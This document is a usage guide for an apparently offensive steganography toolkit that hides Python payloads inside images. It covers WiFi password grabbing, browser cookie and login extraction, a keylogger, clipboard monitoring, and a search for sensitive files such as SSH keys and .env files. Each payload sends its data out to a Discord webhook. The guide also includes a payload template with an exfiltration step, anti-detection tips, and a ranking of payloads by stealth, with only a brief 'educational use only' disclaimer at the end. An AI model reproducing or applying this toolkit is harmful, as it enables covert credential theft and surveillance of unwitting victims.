# Payload Guide 📚

Complete reference for all included payloads with usage examples, requirements, and output samples.

## Table of Contents
- [Basic Payloads](#basic-payloads)
- [Information Gathering](#information-gathering)
- [Credential Theft](#credential-theft)
- [Monitoring Payloads](#monitoring-payloads)
- [Data Exfiltration](#data-exfiltration)
- [All-in-One Payloads](#all-in-one-payloads)

---

## Basic Payloads

### hello_world.py
**Purpose:** Test payload to verify Steganography workflow

**Requirements:** None  
**Discord Exfiltration:** ❌  
**Execution Time:** Instant  

**Usage:**
```bash
python src/main.py workflow test.png example_payloads/hello_world.py out.png --run
```

**Output:**
```
==================================================
PAYLOAD EXECUTED SUCCESSFULLY!
==================================================
Hello from the embedded payload!
This code was hidden inside an image.
==================================================
```

---

## Information Gathering

### system_info.py
**Purpose:** Collects comprehensive system information

**Data Collected:**
- Operating system and version
- Hostname and username
- IP address
- Processor information
- Current directory
- Environment variables

**Requirements:** None  
**Discord Exfiltration:** ✅  
**Execution Time:** Instant  

**Usage:**
```bash
python src/main.py workflow img.png example_payloads/system_info.py out.png --run
```

**Discord Output:**
```
🖥️ System: Windows 10
📍 Hostname: DESKTOP-ABC123
👤 Username: john_doe
🌐 IP Address: 192.168.1.100
💻 Processor: Intel Core i7
📂 Working Dir: C:\Users\john_doe
⏰ Timestamp: 2026-03-22 14:30:45
```

---

### network_scan.py
**Purpose:** Scans local network for active hosts

**Data Collected:**
- Local IP address
- Network range
- Active hosts on network (ping sweep)

**Requirements:** None  
**Discord Exfiltration:** ❌  
**Execution Time:** 1-5 minutes (depends on network size)  

**Usage:**
```bash
python src/main.py workflow pic.png example_payloads/network_scan.py stego.png --run
```

**Output:**
```
Local IP: 192.168.1.100
Scanning network: 192.168.1.0/24

Active hosts:
  ✓ 192.168.1.1
  ✓ 192.168.1.100
  ✓ 192.168.1.105
  ✓ 192.168.1.254

Total active hosts: 4
```

---

### process_monitor.py
**Purpose:** Lists running processes and identifies interesting applications

**Data Collected:**
- All running processes (name, PID, user)
- Interesting processes (browsers, password managers, etc.)
- Process count statistics

**Requirements:** `pip install psutil`  
**Discord Exfiltration:** ✅  
**Execution Time:** 1-2 seconds  

**Usage:**
```bash
# Install requirement first
pip install psutil

python src/main.py workflow img.png example_payloads/process_monitor.py out.png --run
```

---

## Credential Theft

### wifi_grabber.py
**Purpose:** Extracts saved WiFi passwords (Windows only)

**Data Collected:**
- WiFi network SSIDs
- Saved passwords in cleartext

**Requirements:** None (Windows netsh command)  
**Discord Exfiltration:** ✅  
**Execution Time:** Instant  
**Privileges Required:** Standard user (no admin needed)

**Usage:**
```bash
python src/main.py workflow cover.png example_payloads/wifi_grabber.py output.png --run
```

**Discord Output:**
```
📡 HomeNetwork: MySecretPassword123
📡 OfficeWiFi: Company2024!
📡 Coffee_Shop: guestpass
📡 iPhone_Hotspot: appleuser1
```

**Note:** This payload accesses Windows WiFi profiles, which are accessible to all users.

---

### browser_data.py
**Purpose:** Extracts browser history, cookies, and saved login data

**Data Collected:**
- Top visited websites from Chrome/Edge
- Cookie domains and counts
- Saved login usernames (passwords are encrypted)

**Requirements:** None  
**Discord Exfiltration:** ✅  
**Execution Time:** 5-10 seconds  

**Important:** Close browser before running for best results (browser locks database files).

**Usage:**
```bash
python src/main.py workflow img.png example_payloads/browser_data.py out.png --run
```

**Discord Output:**
```
📊 Top Visited Sites (45 total)
• Gmail - My Email (234 visits)
• YouTube (189 visits)
• GitHub (142 visits)

🍪 Cookies (78 domains)
• .google.com (45 cookies)
• .facebook.com (32 cookies)
• .amazon.com (28 cookies)

🔐 Saved Logins (12 found)
• https://github.com
  └ username123
• https://mail.google.com
  └ user@email.com
```

---

## Monitoring Payloads

### keylogger.py
**Purpose:** Records keystrokes for a specified duration

**Data Collected:**
- All keyboard input (keys, special keys, text)
- Timestamps of activity

**Requirements:** `pip install pynput`  
**Discord Exfiltration:** ✅  
**Execution Time:** Configurable (default 60 seconds)  

**Usage:**
```bash
# Install requirement
pip install pynput

# Default 60 seconds
python src/main.py extract image.png keylog.py
python keylog.py

# Custom duration (120 seconds)
python keylog.py 120
```

**Features:**
- Logs all printable characters
- Captures special keys ([enter], [backspace], [tab])
- Handles backspace correctly
- Sends log in chunks to avoid Discord limits

**Output Sample:**
```
Recording keystrokes for 60 seconds...
Start typing (output shown below):
------------------------------------------------------------
Hello, this is a test message[enter]
My password is: [backspace][backspace]secretpass123[enter]
------------------------------------------------------------
Recording complete. Captured 48 keystrokes.
```

---

### clipboard_monitor.py
**Purpose:** Monitors clipboard for changes and logs content

**Data Collected:**
- All clipboard changes
- Timestamps of each change
- Full clipboard content

**Requirements:** `pip install pywin32` (Windows)  
**Discord Exfiltration:** ✅  
**Execution Time:** Configurable (default 30 seconds)  

**Usage:**
```bash
# Install requirement (Windows)
pip install pywin32

# Default 30 seconds
python src/main.py extract img.png clip.py
python clip.py

# Custom duration (60 seconds)
python clip.py 60
```

**Output Sample:**
```
Monitoring clipboard for 30 seconds...
Copy something to test!

[14:32:15] Clipboard changed:
  Hello World

[14:32:28] Clipboard changed:
  john.doe@email.com

[14:32:45] Clipboard changed:
  MyP@ssw0rd123!

==================================================
MONITORING COMPLETE
Captured 3 clipboard changes
==================================================
```

---

## Data Exfiltration

### screenshot.py
**Purpose:** Captures screenshot and notifies via Discord

**Data Collected:**
- Full screen capture
- Screenshot metadata (resolution, size)

**Requirements:** `pip install pillow` (already required by main tool)  
**Discord Exfiltration:** ✅ (notification only, not image upload)  
**Execution Time:** Instant  

**Usage:**
```bash
python src/main.py workflow img.png example_payloads/screenshot.py out.png --run
```

**Output:**
```
Capturing screenshot...
✓ Screenshot saved: screenshot_20260322_143015.png
  Resolution: 1920x1080

Sending notification to Discord...
✓ Notification sent to Discord
```

**Discord Notification:**
```
Filename: screenshot_20260322_143015.png
Resolution: 1920x1080
Size: 1247 KB
Timestamp: 2026-03-22 14:30:15
```

**Note:** Full screenshot upload would exceed Discord message limits. Use file sharing for actual image transfer.

---

### file_finder.py
**Purpose:** Searches for potentially sensitive files

**Search Patterns:**
- Credentials: `*password*`, `*secret*`, `*api_key*`, `*.pem`, `*.key`
- Configs: `*.env`, `config.json`, `*.conf`
- SSH/Certs: `id_rsa*`, `*.ppk`, `*.crt`, `*.p12`
- Databases: `*.db`, `*.sqlite`, `*.sql`
- Browser data: `*Login Data*`, `*Cookies*`
- Documents: `*.txt`, `*.doc`, `*.pdf`, `*.xlsx`

**Data Collected:**
- File paths and names
- File sizes
- Locations found

**Requirements:** None  
**Discord Exfiltration:** ✅  
**Execution Time:** 10-30 seconds  

**Search Locations:**
- User home directory
- Documents folder
- Desktop
- Downloads folder

**Max Depth:** 3 subdirectories  
**Max Files:** 100 files

**Usage:**
```bash
python src/main.py workflow pic.png example_payloads/file_finder.py stego.png --run
```

**Discord Output:**
```
Found 47 sensitive files

📄 `.env`
   └ 2 KB
📄 `config.json`
   └ 5 KB
📄 `password_backup.txt`
   └ 1 KB
📄 `id_rsa`
   └ 3 KB
📄 `credentials.db`
   └ 142 KB

... and 42 more files
```

---

## All-in-One Payloads

### all_in_one.py
**Purpose:** Comprehensive reconnaissance payload combining multiple data sources

**Data Collected:**
- System information (hostname, user, IP, OS)
- WiFi passwords (all networks)
- Interesting files (documents, credentials)

**Requirements:** None  
**Discord Exfiltration:** ✅ (sends 3 separate messages)  
**Execution Time:** 15-30 seconds  

**Usage:**
```bash
python src/main.py workflow cover.png example_payloads/all_in_one.py vacation.png --run
```

**Output:**
```
==================================================
ALL-IN-ONE RECONNAISSANCE PAYLOAD
==================================================

Started: 2026-03-22 14:30:00

[1/3] Gathering system information...
[2/3] Extracting WiFi passwords...
[3/3] Scanning for interesting files...

==================================================
RESULTS SUMMARY
==================================================

📊 SYSTEM INFO:
  hostname: DESKTOP-ABC
  username: john_doe
  system: Windows
  ip: 192.168.1.100

📡 WIFI NETWORKS: 4 found
  • HomeNetwork: password123
  • OfficeWiFi: corporate2024
  • Guest_WiFi: guestpass
  • iPhone: applehotspot

📁 INTERESTING FILES: 23 found
  • passwords.txt
  • backup_keys.zip
  • config.env
  ... and 20 more
```

**Discord Messages:**

**Message 1 - System Info:**
```
🎯 Target Compromised

🖥️ System: Windows 10
📍 Hostname: DESKTOP-ABC
👤 Username: john_doe
🌐 IP: 192.168.1.100
💻 Machine: AMD64
⏰ Timestamp: 2026-03-22 14:30:15
```

**Message 2 - WiFi Credentials:**
```
🔐 WiFi Credentials

Found 4 WiFi networks:

📡 `HomeNetwork: password123`
📡 `OfficeWiFi: corporate2024`
📡 `Guest_WiFi: guestpass`
📡 `iPhone: applehotspot`
```

**Message 3 - File Discovery:**
```
📁 File Discovery

Found 23 interesting files:

📄 passwords.txt
📄 backup_keys.zip
📄 config.env
📄 api_credentials.json
📄 private.key

... and 18 more files
```

---

## Webhook Configuration

All payloads with Discord exfiltration use `webhook_utils.py` for data transmission.

### Setup
1. Create Discord webhook in your server
2. Edit `example_payloads/webhook_utils.py`:
   ```python
   WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
   ```
3. Test: `python example_payloads/webhook_utils.py`

### Features
- Automatic formatting with Discord embeds
- Color-coded messages
- Timestamps on all messages
- Rate limit handling
- Error recovery

---

## Creating Custom Payloads

### Template Structure
```python
#!/usr/bin/env python3
"""
Payload Description
"""

import sys
import os

# Import webhook utilities
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

def main():
    print("=" * 60)
    print("PAYLOAD NAME")
    print("=" * 60)
    
    # Your payload logic here
    data = collect_data()
    
    # Display locally
    print(data)
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        send_to_discord("Title", data)

if __name__ == "__main__":
    main()
```

### Best Practices
1. **Always print locally** - Verify data before exfiltration
2. **Handle errors** - Use try/except for all operations
3. **Limit data size** - Discord has 2000 char message limit
4. **Add timestamps** - Track when data was collected
5. **Test standalone** - Run payload directly before embedding
6. **Document requirements** - List all dependencies
7. **Respect rate limits** - Add delays between Discord messages

### Testing Checklist
- [ ] Runs standalone outside image
- [ ] Runs when embedded and extracted
- [ ] Handles missing dependencies gracefully
- [ ] Sends correct data to Discord
- [ ] Doesn't crash on errors
- [ ] Output is readable and formatted
- [ ] File permissions are handled

---

## Security & Detection

### Anti-Detection Tips
- Use common file names for output
- Delete temporary files after use
- Avoid obvious process names
- Run during normal work hours
- Limit network connections
- Use legitimate image file names

### Stealth Considerations
- Screenshots are instant (< 1 second)
- WiFi grabber leaves no traces
- File finder is read-only
- Browser data copying is detectable if browser open
- Keylogger creates ongoing process
- Network scan is slow and noisy (ICMP pings)

### Most Stealthy Payloads (ranked)
1. **wifi_grabber.py** - Instant, no traces, built-in command
2. **system_info.py** - Instant, read-only system calls
3. **screenshot.py** - Instant, single file created
4. **file_finder.py** - Read-only, but touches many files
5. **browser_data.py** - Copies database files
6. **process_monitor.py** - Enumerates all processes
7. **clipboard_monitor.py** - Continuous monitoring
8. **keylogger.py** - Obvious malicious behavior
9. **network_scan.py** - Network noise, firewall alerts

---

## Legal Disclaimer

**EDUCATIONAL USE ONLY**

These payloads are provided for:
- Security research
- Authorized penetration testing
- Educational demonstrations
- Personal system testing

**NEVER use on systems without explicit written authorization.**

Unauthorized access is illegal under:
- Computer Fraud and Abuse Act (USA)
- Computer Misuse Act (UK)
- Similar laws worldwide

**You are responsible for compliance with all applicable laws.**

---

## Troubleshooting

### Payload doesn't run
- Check Python syntax: `python -m py_compile payload.py`
- Test standalone: `python example_payloads/payload.py`
- Check dependencies: `pip list`

### Discord webhook fails
- Verify webhook URL is correct
- Check internet connection
- Verify webhook not deleted
- Test: `python example_payloads/webhook_utils.py`

### No data collected
- Check permissions (run as admin if needed)
- Verify target data exists
- Check error messages in output
- Test individual functions

### Image too small error
- Use larger image file
- Reduce payload size
- Calculate: (width × height × 3) / 8 = max bytes

---

**For more information, see [README.md](README.md)**
